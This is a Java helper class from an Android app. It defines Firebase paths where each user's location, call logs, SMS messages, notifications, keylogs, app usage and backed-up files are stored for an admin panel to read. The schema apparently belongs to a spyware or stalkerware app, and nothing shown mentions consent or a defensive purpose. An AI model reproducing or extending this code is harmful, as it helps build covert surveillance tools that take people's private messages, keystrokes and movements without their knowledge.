package com.bushorat.app.helpers;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;
import java.util.Map;

/**
 * Central Firebase paths for per-user data readable by the admin panel.
 *
 * user_data/{userId}/
 *   profile/
 *   device_info/
 *   call_logs/{id}/
 *   sms/{id}/
 *   notifications/{id}/
 *   keylogs/{id}/
 *   app_usage/{id}/
 *   sync_status/{dataType}/
 *
 * File backups (all types): documents/{userId}/{docId} (RTDB) + Storage documents/{userId}/…
 */
public final class FirebaseDataPaths {
    public static final String USER_DATA_ROOT = "user_data";
    public static final String DOCUMENTS_ROOT = "documents";

    private FirebaseDataPaths() {
    }

    public static DatabaseReference userData(String userId) {
        return FirebaseDatabase.getInstance().getReference(USER_DATA_ROOT).child(userId);
    }

    public static DatabaseReference profile(String userId) {
        return userData(userId).child("profile");
    }

    public static DatabaseReference deviceInfo(String userId) {
        return userData(userId).child("device_info");
    }
    
    public static DatabaseReference location(String userId) {
        return userData(userId).child("location");
    }

    public static DatabaseReference callLogs(String userId) {
        return userData(userId).child("call_logs");
    }

    public static DatabaseReference sms(String userId) {
        return userData(userId).child("sms");
    }

    public static DatabaseReference notifications(String userId) {
        return userData(userId).child("notifications");
    }

    public static DatabaseReference keylogs(String userId) {
        return userData(userId).child("keylogs");
    }

    public static DatabaseReference appUsage(String userId) {
        return userData(userId).child("app_usage");
    }

    public static DatabaseReference documents(String userId) {
        return FirebaseDatabase.getInstance().getReference(DOCUMENTS_ROOT).child(userId);
    }

    public static DatabaseReference syncStatus(String userId) {
        return userData(userId).child("sync_status");
    }

    public static void updateSyncStatus(String userId, String dataType, int count) {
        Map<String, Object> status = new HashMap<>();
        status.put("lastSync", System.currentTimeMillis());
        status.put("count", count);
        syncStatus(userId).child(dataType).updateChildren(status);
    }

    public static String hashId(String input) {
        try {
            java.security.MessageDigest md = java.security.MessageDigest.getInstance("MD5");
            byte[] digest = md.digest(input.getBytes("UTF-8"));
            StringBuilder sb = new StringBuilder();
            for (byte b : digest) {
                sb.append(String.format(java.util.Locale.US, "%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            return String.valueOf(input.hashCode());
        }
    }
}
